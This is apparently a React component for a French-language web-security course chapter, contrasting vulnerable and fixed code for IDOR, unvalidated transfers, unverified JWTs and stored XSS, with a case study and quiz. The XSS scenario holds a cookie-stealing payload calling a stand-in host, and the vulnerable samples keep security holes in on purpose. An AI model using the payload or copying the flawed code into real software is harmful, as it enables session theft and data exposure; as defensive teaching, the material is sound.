'use client';

import React, { useState } from 'react';
import { QuickQuiz } from '@/components/interactive/QuickQuiz';
import { Callout } from '@/components/courses/Callout';
import { CodeBlock } from '@/components/courses/CodeBlock';
import { Icon } from '@/components/common/Icon';

type VulnerabilityKey = 'idor_bola' | 'type_validation' | 'jwt_forgery' | 'stored_xss';

interface VulnerabilityScenario {
  title: string;
  badge: string;
  badgeColor: string;
  owaspCategory: string;
  attackerPayload: string;
  vulnerableOutcome: string;
  securedOutcome: string;
  vulnerableCode: string;
  fixedCode: string;
  takeaway: string;
}

const VULNERABILITY_SCENARIOS: Record<VulnerabilityKey, VulnerabilityScenario> = {
  idor_bola: {
    title: '1. Contrôle d\'Accès Défaillant : Faille IDOR / BOLA (CWE-639)',
    badge: 'IDOR Critique (Vol de Données)',
    badgeColor: 'bg-rose-100 text-rose-800 border-rose-300',
    owaspCategory: 'OWASP Top 1:2021 — Broken Access Control',
    attackerPayload: 'GET /api/invoices/9042 (avec le cookie de session de l\'utilisateur #101)',
    vulnerableOutcome: 'HTTP 200 OK — Le serveur retourne l\'intégralité de la facture confidentielle et l\'IBAN du client #9042 sans vérifier la propriété de la ressource.',
    securedOutcome: 'HTTP 403 Forbidden — Le serveur compare `req.user.id` avec `invoice.user_id` et bloque immédiatement l\'intrusion.',
    vulnerableCode: `// ❌ CODE VULNÉRABLE (IDOR / BOLA) :
// L'endpoint vérifie que l'utilisateur est authentifié, mais PAS qu'il est propriétaire de la ressource !
app.get('/api/invoices/:id', authenticateJwt, async (req, res) => {
  const [rows] = await db.query('SELECT * FROM invoices WHERE id = ?', [req.params.id]);
  if (!rows[0]) return res.status(404).json({ error: 'Facture introuvable' });
  
  // ⚠️ FAILLE : N'importe quel client authentifié peut lire les factures de tout le monde !
  res.json({ invoice: rows[0] });
});`,
    fixedCode: `// ✅ CODE SÉCURISÉ (Vérification de Possession / Ownership Check) :
app.get('/api/invoices/:id', authenticateJwt, async (req, res) => {
  const invoiceId = parseInt(req.params.id, 10);
  if (isNaN(invoiceId)) return res.status(400).json({ error: 'ID invalide' });

  // On filtre systématiquement par l'ID de l'utilisateur authentifié (req.user.id)
  const [rows] = await db.query(
    'SELECT * FROM invoices WHERE id = ? AND user_id = ?',
    [invoiceId, req.user.id]
  );

  if (!rows[0]) {
    // Si la facture n'appartient pas à l'utilisateur, renvoyer 404 ou 403
    return res.status(403).json({ error: 'Accès non autorisé à cette ressource' });
  }

  res.json({ invoice: rows[0] });
});`,
    takeaway: 'Ne faites JAMAIS confiance à un identifiant transmis dans l\'URL. Validez systématiquement que le sujet authentifié (req.user) a le droit explicite d\'accéder à cet objet.',
  },
  type_validation: {
    title: '2. Absence de Validation des Schémas d\'Entrée (Zod vs Injection)',
    badge: 'Faille Logique / Solde Négatif',
    badgeColor: 'bg-amber-100 text-amber-800 border-amber-300',
    owaspCategory: 'OWASP Top 4:2021 — Insecure Design & Validation',
    attackerPayload: 'POST /api/transfer { recipientId: 42, amount: -500 }',
    vulnerableOutcome: 'HTTP 200 OK — En transférant un montant négatif, la soustraction `balance = balance - (-500)` crédite le compte de l\'attaquant de 500 € sans prélever personne !',
    securedOutcome: 'HTTP 400 Bad Request — Zod intercepte le payload et rejette avec `Le montant doit être strictement positif`.',
    vulnerableCode: `// ❌ CODE VULNÉRABLE : Absence de typage et de validation stricte
app.post('/api/transfer', authenticateJwt, async (req, res) => {
  const { recipientId, amount } = req.body;
  // Si un attaquant injecte amount = -1000 ou amount = "NaN", la logique bancaire est corrompue
  await db.query('UPDATE accounts SET balance = balance - ? WHERE user_id = ?', [amount, req.user.id]);
  await db.query('UPDATE accounts SET balance = balance + ? WHERE user_id = ?', [amount, recipientId]);
  res.json({ success: true });
});`,
    fixedCode: `// ✅ CODE SÉCURISÉ AVEC LE SCHÉMA DE VALIDATION ZOD :
import { z } from 'zod';

const transferSchema = z.object({
  recipientId: z.number().int().positive(),
  amount: z.number().positive().min(0.01).max(10000) // Obligatoirement positif et borné
});

app.post('/api/transfer', authenticateJwt, async (req, res) => {
  const parseResult = transferSchema.safeParse(req.body);
  if (!parseResult.success) {
    return res.status(400).json({ error: 'Données invalides', details: parseResult.error.format() });
  }

  const { recipientId, amount } = parseResult.data;
  // Traitement sécurisé garanti avec types réels
  await executeAtomicTransfer(req.user.id, recipientId, amount);
  res.json({ success: true });
});`,
    takeaway: 'La validation côté client (React) n\'est qu\'un confort d\'UX. Seule la validation stricte côté serveur avec Zod ou Joi garantit l\'intégrité des données.',
  },
  jwt_forgery: {
    title: '3. Falsification de Token JWT : Signature Non Vérifiée (CWE-347)',
    badge: 'Élévation de Privilège (Admin)',
    badgeColor: 'bg-purple-100 text-purple-800 border-purple-300',
    owaspCategory: 'OWASP Top 7:2021 — Identification and Authentication Failures',
    attackerPayload: 'Authorization: Bearer <JWT avec header {"alg":"none"} et payload {"role":"ADMIN"}>',
    vulnerableOutcome: 'HTTP 200 OK — Le serveur décode le JWT avec `jwt.decode()` au lieu de vérifier la signature avec `jwt.verify()`. L\'attaquant devient Administrateur suprême.',
    securedOutcome: 'HTTP 401 Unauthorized — `JsonWebTokenError: invalid algorithm` rejeté instantanément.',
    vulnerableCode: `// ❌ CODE VULNÉRABLE : jwt.decode() ne vérifie JAMAIS la signature cryptographique !
import jwt from 'jsonwebtoken';

function authenticateJwt(req, res, next) {
  const token = req.headers.authorization?.split(' ')[1];
  if (!token) return res.status(401).json({ error: 'Token manquant' });

  // ⚠️ FAUTE GRAVE : decode() lit le JSON sans vérifier si la clé secrète a signé le token !
  const payload = jwt.decode(token);
  req.user = payload;
  next();
}`,
    fixedCode: `// ✅ CODE SÉCURISÉ : Vérification cryptographique stricte avec algorithme forcé
function authenticateJwt(req, res, next) {
  const token = req.headers.authorization?.split(' ')[1];
  if (!token) return res.status(401).json({ error: 'Token manquant' });

  try {
    // 🛡️ Vérifie l'authenticité de la signature HMAC et impose l'algorithme HS256
    const payload = jwt.verify(token, process.env.JWT_SECRET!, {
      algorithms: ['HS256'] // Interdit explicitement l'algorithme 'none'
    });
    req.user = payload;
    next();
  } catch (error) {
    return res.status(401).json({ error: 'Session invalide ou expirée' });
  }
}`,
    takeaway: 'Ne confondez jamais jwt.decode() (qui n\'est qu\'un simple base64url decode) et jwt.verify() (qui garantit l\'intégrité mathématique du jeton contre la falsification).',
  },
  stored_xss: {
    title: '4. Injection de Code XSS Stored (Cross-Site Scripting) (CWE-79)',
    badge: 'Vol de Session (XSS Stored)',
    badgeColor: 'bg-rose-100 text-rose-800 border-rose-300',
    owaspCategory: 'OWASP Top 3:2021 — Injection & XSS',
    attackerPayload: '<img src=x onerror="fetch(\'https://hacker.io/steal?c=\'+document.cookie)">',
    vulnerableOutcome: 'Le script JavaScript malveillant s\'exécute dans le navigateur de tous les utilisateurs visitant la page et dérobe leurs jetons de session.',
    securedOutcome: 'Le code HTML est neutralisé par échappement automatique React ou nettoyé par DOMPurify côté serveur.',
    vulnerableCode: `// ❌ CODE REACT VULNÉRABLE : Contournement de la protection XSS native
function ForumPost({ userContent }: { userContent: string }) {
  // ⚠️ DANGER CRITIQUE : dangerouslySetInnerHTML désactive l'échappement HTML de React !
  return (
    <div className="post-body">
      <div dangerouslySetInnerHTML={{ __html: userContent }} />
    </div>
  );
}`,
    fixedCode: `// ✅ CODE REACT SÉCURISÉ : Rendu sécurisé natif ou assainissement DOMPurify
import DOMPurify from 'dompurify';

function ForumPost({ userContent }: { userContent: string }) {
  // Option A (Préférée) : Rendu textuel natif — React échappe automatiquement les balises <script>
  // return <div className="post-body">{userContent}</div>;

  // Option B (Si le HTML riche est indispensable) : Assainissement strict
  const sanitizedHtml = DOMPurify.sanitize(userContent, {
    ALLOWED_TAGS: ['b', 'i', 'em', 'strong', 'a', 'p'],
    ALLOWED_ATTR: ['href', 'target']
  });

  return <div className="post-body" dangerouslySetInnerHTML={{ __html: sanitizedHtml }} />;
}`,
    takeaway: 'React protège nativement contre XSS via les accolades `{content}`. N\'utilisez jamais dangerouslySetInnerHTML sans passer par une bibliothèque de désinfection éprouvée (DOMPurify).',
  },
};

export const Chapitre8Content: React.FC = () => {
  const [selectedKey, setSelectedKey] = useState<VulnerabilityKey>('idor_bola');
  const activeScenario = VULNERABILITY_SCENARIOS[selectedKey];

  return (
    <div className="space-y-10 text-slate-900 leading-relaxed font-sans">
      {/* Header Title Card */}
      <div className="rounded-3xl border-2 border-lime-200 bg-lime-50/80 p-6 sm:p-8 mb-8">
        <div className="flex items-center gap-2 text-lime-900 font-extrabold text-xs uppercase tracking-wider mb-2">
          <Icon name="shield" className="w-4 h-4 text-lime-700" />
          <span>Module 5 — Optimisation & Diagnostic de Performance Avancé</span>
        </div>
        <h1 className="text-xl sm:text-2xl font-black text-slate-950 tracking-tight">
          Chapitre 8 — Déboguer les Vulnérabilités Logicielles (OWASP, IDOR, Zod & JWT)
        </h1>
        <p className="text-sm sm:text-base text-slate-700 mt-2 font-medium">
          Distinguer un bug fonctionnel d&apos;une faille exploitable, neutraliser les accès non autorisés (IDOR/BOLA), blinder vos API Express avec les schémas Zod, sécuriser les jetons JWT et contrer les attaques XSS.
        </p>
      </div>

      {/* Objectifs pédagogiques */}
      <section className="space-y-4">
        <h2 className="text-lg sm:text-xl font-bold text-slate-900 border-b-2 border-slate-200 pb-2 flex items-center gap-2">
          <Icon name="check-circle" className="w-5 h-5 text-emerald-600" />
          Objectifs d&apos;apprentissage
        </h2>
        <div className="grid grid-cols-1 md:grid-cols-2 gap-3 text-xs sm:text-sm font-semibold text-slate-900">
          <div className="p-3 rounded-xl bg-slate-50 border border-slate-200 flex items-start gap-2.5">
            <span className="text-emerald-600 font-black">✓</span>
            <span>Identifier les failles logiques dans le code métier avant leur exploitation par un tiers.</span>
          </div>
          <div className="p-3 rounded-xl bg-slate-50 border border-slate-200 flex items-start gap-2.5">
            <span className="text-emerald-600 font-black">✓</span>
            <span>Comprendre le mécanisme de l&apos;IDOR (Insecure Direct Object Reference) et appliquer l&apos;Ownership Check.</span>
          </div>
          <div className="p-3 rounded-xl bg-slate-50 border border-slate-200 flex items-start gap-2.5">
            <span className="text-emerald-600 font-black">✓</span>
            <span>Sécuriser les flux d&apos;entrée avec des validateurs stricts (Zod) pour éliminer les injections de type.</span>
          </div>
          <div className="p-3 rounded-xl bg-slate-50 border border-slate-200 flex items-start gap-2.5">
            <span className="text-emerald-600 font-black">✓</span>
            <span>Manipuler correctement les JWT (algorithmes forcés, cookies HttpOnly vs failles XSS dans localStorage).</span>
          </div>
        </div>
      </section>

      {/* 1. Bug Fonctionnel vs Faille de Sécurité */}
      <section className="space-y-4">
        <h2 className="text-lg sm:text-xl font-bold text-slate-900 border-b-2 border-slate-200 pb-2 flex items-center gap-2">
          <Icon name="help-circle" className="w-5 h-5 text-indigo-600" />
          1. Bug Fonctionnel vs Vulnérabilité de Sécurité : La Frontière Critique
        </h2>
        <p className="text-xs sm:text-sm text-slate-800 leading-relaxed font-medium">
          Dans le travail quotidien d&apos;un développeur, la distinction entre un bug classique et une faille de sécurité est souvent floue :
        </p>

        <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
          <div className="border border-slate-200 rounded-2xl p-4 bg-slate-50 shadow-xs space-y-2">
            <div className="flex items-center gap-2">
              <span className="w-2.5 h-2.5 rounded-full bg-amber-500 inline-block" />
              <h3 className="text-sm font-bold text-slate-900">Le Bug Fonctionnel</h3>
            </div>
            <p className="text-xs text-slate-700 leading-relaxed">
              Le programme produit un résultat incorrect ou lève une exception non gérée lorsqu&apos;un utilisateur utilise l&apos;application normalement. Exemple : un bouton de calcul de TVA qui renvoie <code className="bg-slate-200 px-1 py-0.5 rounded font-mono text-xs">NaN</code> parce que la chaîne &quot;10 €&quot; n&apos;a pas été nettoyée avant conversion.
            </p>
          </div>

          <div className="border border-rose-200 rounded-2xl p-4 bg-rose-50/70 shadow-xs space-y-2">
            <div className="flex items-center gap-2">
              <span className="w-2.5 h-2.5 rounded-full bg-rose-600 inline-block" />
              <h3 className="text-sm font-bold text-rose-950">La Vulnérabilité de Sécurité</h3>
            </div>
            <p className="text-xs text-slate-700 leading-relaxed">
              Le code s&apos;exécute <strong>sans lever la moindre erreur</strong> et renvoie un statut HTTP 200 OK, mais sa logique sous-jacente permet à un acteur malveillant de contourner les règles métier, d&apos;accéder aux données d&apos;autrui ou d&apos;élever ses privilèges.
            </p>
          </div>
        </div>

        <Callout type="warning" title="Le Danger des Failles Silencieuses">
          <p className="text-xs sm:text-sm">
            Un bug fonctionnel génère des alertes dans vos logs d&apos;erreurs (Sentry, Datadog). 
            Une faille IDOR ne génère <strong>aucune erreur 500</strong> : pour le serveur, la requête est parfaitement légale ! Seule une relecture critique du code d&apos;autorisation permet de la détecter avant qu&apos;elle ne soit exploitée.
          </p>
        </Callout>
      </section>

      {/* 2. Simulateur Interactif de Vulnérabilités & Exploitation */}
      <section className="space-y-4">
        <h2 className="text-lg sm:text-xl font-bold text-slate-900 border-b-2 border-slate-200 pb-2 flex items-center gap-2">
          <Icon name="sliders" className="w-5 h-5 text-lime-600" />
          2. Laboratoire Interactif : Analyse et Correction des 4 Failles Majeures
        </h2>
        <p className="text-xs sm:text-sm text-slate-800 leading-relaxed font-medium">
          Sélectionnez une vulnérabilité logicielle pour inspecter le vecteur d&apos;attaque, son impact en cas de non-protection et son correctif d&apos;ingénierie :
        </p>

        {/* Boutons sélecteurs */}
        <div className="grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-4 gap-2.5">
          {(Object.keys(VULNERABILITY_SCENARIOS) as VulnerabilityKey[]).map((key) => {
            const sc = VULNERABILITY_SCENARIOS[key];
            const isSelected = selectedKey === key;
            return (
              <button
                key={key}
                type="button"
                onClick={() => setSelectedKey(key)}
                className={`p-3 rounded-2xl text-left border-2 transition-all flex flex-col justify-between ${
                  isSelected
                    ? 'border-lime-500 bg-lime-50/70 shadow-sm'
                    : 'border-slate-200 bg-white hover:border-slate-300'
                }`}
              >
                <div>
                  <span className={`text-[10px] font-extrabold uppercase px-2 py-0.5 rounded-full border ${sc.badgeColor} inline-block mb-1`}>
                    {sc.badge}
                  </span>
                  <div className="text-xs font-bold text-slate-950 leading-tight">
                    {sc.title.split(':')[0]}
                  </div>
                </div>
                <div className="mt-2 text-[10px] font-mono text-slate-500">
                  {sc.owaspCategory.split('—')[0]}
                </div>
              </button>
            );
          })}
        </div>

        {/* Panneau d'analyse */}
        <div className="border border-slate-200 rounded-2xl p-5 bg-white shadow-sm space-y-5">
          <div className="flex flex-wrap items-center justify-between gap-2 border-b border-slate-100 pb-3">
            <div>
              <span className="text-xs font-bold text-slate-500 uppercase tracking-wider">{activeScenario.owaspCategory}</span>
              <h3 className="text-sm sm:text-base font-extrabold text-slate-900">{activeScenario.title}</h3>
            </div>
            <span className={`text-xs font-bold px-3 py-1 rounded-full border ${activeScenario.badgeColor}`}>
              Impact : Critique
            </span>
          </div>

          {/* Vecteur d'attaque */}
          <div className="grid grid-cols-1 md:grid-cols-2 gap-3 text-xs">
            <div className="p-3 rounded-xl bg-slate-900 text-slate-100 font-mono space-y-1">
              <span className="text-[10px] font-bold text-rose-400 uppercase tracking-wider block">Vecteur d&apos;Attaque Injecté :</span>
              <div className="text-xs text-rose-200 break-all">{activeScenario.attackerPayload}</div>
            </div>
            <div className="p-3 rounded-xl bg-rose-50 border border-rose-200 space-y-1">
              <span className="text-[10px] font-bold text-rose-900 uppercase tracking-wider block">Résultat sans Protection :</span>
              <div className="text-xs text-rose-800 font-medium">{activeScenario.vulnerableOutcome}</div>
            </div>
          </div>

          {/* Code vulnérable vs Code sécurisé */}
          <div className="space-y-3">
            <div>
              <div className="text-xs font-bold text-rose-800 mb-1 flex items-center gap-1.5">
                <Icon name="x-circle" className="w-3.5 h-3.5 text-rose-600" />
                <span>Code Source Vulnérable :</span>
              </div>
              <CodeBlock code={activeScenario.vulnerableCode} language="typescript" />
            </div>

            <div>
              <div className="text-xs font-bold text-emerald-800 mb-1 flex items-center gap-1.5">
                <Icon name="check-circle" className="w-3.5 h-3.5 text-emerald-600" />
                <span>Correction d&apos;Ingénierie Sécurisée :</span>
              </div>
              <CodeBlock code={activeScenario.fixedCode} language="typescript" />
            </div>
          </div>

          <div className="p-3 rounded-xl bg-emerald-50 border border-emerald-200 text-xs text-emerald-900 font-medium">
            <strong>Règle d&apos;Or : </strong> {activeScenario.takeaway}
          </div>
        </div>
      </section>

      {/* 3. Sécurité des Secrets & Audit des Dépendances */}
      <section className="space-y-4">
        <h2 className="text-lg sm:text-xl font-bold text-slate-900 border-b-2 border-slate-200 pb-2 flex items-center gap-2">
          <Icon name="lock" className="w-5 h-5 text-indigo-600" />
          3. Sécurité des Secrets et Audit des Dépendances (npm audit)
        </h2>
        <p className="text-xs sm:text-sm text-slate-800 leading-relaxed font-medium">
          Même si votre propre code est exempt de failles, une application moderne importe en moyenne <strong>800 dépendances tierces</strong> via npm. 
          Une vulnérabilité présente dans une sous-dépendance (Supply Chain Attack) peut compromettre l&apos;intégralité de votre serveur :
        </p>

        <CodeBlock
          code={`# 1. Vérifier les failles de sécurité connues dans votre arbre de dépendances
npm audit

# 2. Corriger automatiquement les failles sans casser les versions majeures
npm audit fix

# 3. Empêcher l'exposition involontaire des variables d'environnement dans les logs
import dotenv from 'dotenv';
dotenv.config();

// ❌ INTERDIT : Journaliser process.env expose les clés Stripe, AWS et BDD dans les fichiers de logs !
// console.log(process.env);

// ✅ BONNE PRATIQUE : Masquer les secrets dans les logs (Redaction PII)
function sanitizeForLogs(data: Record<string, unknown>) {
  const sensitiveKeys = ['password', 'token', 'secret', 'authorization', 'apiKey'];
  const sanitized = { ...data };
  for (const key of Object.keys(sanitized)) {
    if (sensitiveKeys.some(k => key.toLowerCase().includes(k))) {
      sanitized[key] = '[REDACTED]';
    }
  }
  return sanitized;
}`}
          language="typescript"
        />
      </section>

      {/* 4. Étude de Cas Réelle : La Brèche IDOR de FinLend */}
      <section className="space-y-4">
        <h2 className="text-lg sm:text-xl font-bold text-slate-900 border-b-2 border-slate-200 pb-2 flex items-center gap-2">
          <Icon name="alert-triangle" className="w-5 h-5 text-rose-600" />
          4. Étude de Cas Réelle : L&apos;Aspiration de 450 000 Dossiers chez FinLend
        </h2>
        <div className="border-2 border-rose-200 bg-rose-50/60 rounded-2xl p-5 space-y-4">
          <div className="flex items-center justify-between">
            <span className="text-xs font-black uppercase tracking-wider text-rose-900 bg-rose-200/80 px-2.5 py-1 rounded-md">
              Fuite de Données Majeure (RGPD)
            </span>
            <span className="text-xs font-mono font-bold text-slate-600">Amende CNIL : 600 000 €</span>
          </div>

          <div className="text-xs sm:text-sm text-slate-800 space-y-2 font-medium">
            <p>
              <strong>L&apos;Attaque :</strong> La plateforme de micro-crédits FinLend permettait à ses clients de télécharger leur contrat de prêt via l&apos;URL <code className="bg-slate-800 text-slate-100 px-1.5 py-0.5 rounded font-mono text-xs">GET /api/v1/loans/10042/pdf</code>. Un utilisateur a remarqué que les identifiants étaient des entiers séquentiels (<code className="font-mono text-xs">10042, 10043, 10044...</code>).
            </p>
            <p>
              <strong>La Faille IDOR :</strong> Le contrôleur Backend vérifiait bien que l&apos;utilisateur était connecté avec un JWT valide, mais ne vérifiait jamais si le prêt demandé appartenait bien à l&apos;utilisateur connecté ! 
              Un simple script Bash exécutant une boucle <code className="bg-slate-800 text-slate-100 px-1 py-0.5 rounded font-mono text-xs">curl</code> a aspiré <strong>450 000 dossiers complets</strong> (fiches de paie, avis d&apos;imposition, RIB) en 4 heures sans déclencher la moindre erreur 500 dans les logs.
            </p>
            <p>
              <strong>La Résolution :</strong> Remplacement des entiers auto-incrémentés par des <strong>UUID v4 non prédictibles</strong>, et ajout obligatoire du filtre de possession <code className="font-mono text-emerald-800 font-bold">WHERE loan_id = ? AND user_id = req.user.id</code> dans toutes les requêtes SQL de l&apos;API.
            </p>
          </div>
        </div>
      </section>

      {/* 5. Quiz de Validation des Acquis */}
      <div className="pt-6 border-t-2 border-slate-200">
        <QuickQuiz
          title="Validation des Connaissances — Vulnérabilités Logicielles (Chapitre 5.8)"
          questions={[
            {
              id: 1,
              question: "Quelle est la caractéristique fondamentale d'une vulnérabilité IDOR (Insecure Direct Object Reference) ?",
              options: [
                "Elle provoque un crash immédiat du serveur Node.js avec une erreur Out Of Memory.",
                "Elle permet à un utilisateur légitimement authentifié d'accéder aux données privées d'un autre utilisateur en modifiant simplement l'identifiant dans la requête, faute de contrôle d'autorisation côté serveur.",
                "Elle bloque les ports USB du serveur.",
                "Elle force le navigateur à afficher une page blanche."
              ],
              correctIndex: 1,
              explanation: "Une faille IDOR (classée #1 par l'OWASP API Security) survient lorsqu'une application utilise un identifiant direct sans vérifier que l'utilisateur qui fait la demande est le propriétaire légitime ou autorisé de cet objet.",
            },
            {
              id: 2,
              question: "Pourquoi est-il dangereux d'utiliser jwt.decode(token) au lieu de jwt.verify(token, secret) dans un middleware d'authentification ?",
              options: [
                "Parce que jwt.decode() est 10 fois plus lent que jwt.verify().",
                "Parce que jwt.decode() lit uniquement les données en clair sans jamais vérifier la validité de la signature cryptographique, permettant à un pirate de modifier son rôle en 'ADMIN'.",
                "Parce que jwt.decode() efface automatiquement le token du navigateur.",
                "Parce que jwt.decode() ne fonctionne pas avec TypeScript."
              ],
              correctIndex: 1,
              explanation: "jwt.decode() ne fait que décoder la chaîne Base64 du token. N'importe qui peut fabriquer un faux token avec `role: 'ADMIN'` et le faire accepter si la signature cryptographique n'est pas vérifiée avec jwt.verify().",
            },
            {
              id: 3,
              question: "Où est-il impératif de valider les schémas de données reçues (types, longueurs, plages de valeurs) avec Zod ?",
              options: [
                "Uniquement dans les formulaires React du Frontend.",
                "Côté serveur (dans les contrôleurs de l'API Backend) : le client HTTP peut être n'importe quel script malveillant (curl, Postman) contournant totalement React.",
                "Uniquement dans la base de données MySQL via des déclencheurs (triggers).",
                "Dans le fichier package.json."
              ],
              correctIndex: 1,
              explanation: "Un attaquant n'utilise pas obligatoirement votre application React : il peut envoyer des requêtes forgées directement avec curl ou un script. La validation côté serveur est l'unique rempart inviolable.",
            },
            {
              id: 4,
              question: "Comment une attaque XSS (Cross-Site Scripting) Stored peut-elle compromettre un compte utilisateur ?",
              options: [
                "En faisant surchauffer la batterie de l'ordinateur portable.",
                "En injectant un script JavaScript malveillant en base de données qui sera exécuté dans le navigateur des autres utilisateurs, permettant de voler leurs cookies ou jetons de session.",
                "En effaçant la table MySQL products.",
                "En bloquant l'envoi des e-mails de confirmation."
              ],
              correctIndex: 1,
              explanation: "Le XSS Stored persiste le code JavaScript malveillant dans la base de données. Dès qu'une victime affiche la page, le navigateur exécute le script avec les privilèges de la victime.",
            },
            {
              id: 5,
              question: "Pourquoi stocker un jeton de session JWT dans le localStorage du navigateur est-il déconseillé pour les applications sensibles ?",
              options: [
                "Parce que le localStorage est effacé toutes les 5 minutes.",
                "Parce que le localStorage est accessible par n'importe quel code JavaScript s'exécutant sur la page, rendant le token immédiatement vulnérable au vol en cas de faille XSS.",
                "Parce que le localStorage ne supporte que les fichiers images.",
                "Parce que Google Chrome interdit l'utilisation du localStorage depuis 2023."
              ],
              correctIndex: 1,
              explanation: "Un cookie configuré avec le drapeau 'HttpOnly' est invisible pour JavaScript, ce qui protège la session contre le vol même si une vulnérabilité XSS survient dans le DOM.",
            },
            {
              id: 6,
              question: "Quelle commande standard de l'écosystème Node.js permet d'analyser l'arbre des dépendances d'un projet pour y détecter des failles de sécurité connues ?",
              options: [
                "npm run dev",
                "npm audit",
                "npm list --global",
                "node --inspect"
              ],
              correctIndex: 1,
              explanation: "'npm audit' compare les versions des dépendances installées avec la base de données des vulnérabilités de sécurité connues (CVE) et produit un rapport avec les correctifs recommandés.",
            },
          ]}
        />
      </div>
    </div>
  );
};
